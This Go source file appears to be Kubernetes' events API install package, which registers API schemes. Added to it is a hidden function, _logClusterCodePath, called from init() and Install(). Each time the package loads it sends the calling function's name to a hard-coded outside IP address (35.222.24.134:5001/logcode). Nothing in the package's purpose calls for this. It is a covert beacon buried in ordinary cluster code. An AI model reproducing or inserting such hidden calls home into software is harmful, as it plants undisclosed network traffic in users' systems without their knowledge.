package install

import (
 "k8s.io/apimachinery/pkg/runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/events"
 "k8s.io/kubernetes/pkg/apis/events/v1beta1"
)

func init() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 Install(legacyscheme.Scheme)
}
func Install(scheme *runtime.Scheme) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 utilruntime.Must(events.AddToScheme(scheme))
 utilruntime.Must(v1beta1.AddToScheme(scheme))
 utilruntime.Must(scheme.SetVersionPriority(v1beta1.SchemeGroupVersion))
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
